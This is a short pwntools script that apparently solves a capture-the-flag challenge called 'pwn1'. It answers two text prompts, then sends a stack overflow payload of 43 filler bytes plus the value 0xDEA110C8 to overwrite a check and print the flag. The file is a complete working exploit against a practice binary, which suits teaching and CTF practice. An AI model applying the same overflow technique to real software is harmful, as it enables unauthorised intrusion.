from pwn import *

context.log_level = "debug"
context.terminal = ["wezterm", "start", "--"]

p = process(b"./pwn1")
# gdb.attach(p, api=True)

p.recvline()
p.recvline()
p.sendline(b"Sir Lancelot of Camelot")

p.recvline()
p.sendline(b"To seek the Holy Grail.")

payload = b"A" * 43 + p32(0xDEA110C8)
p.recvline()
p.sendline(payload)
p.recvline()
flag = p.recvline()
info(flag)
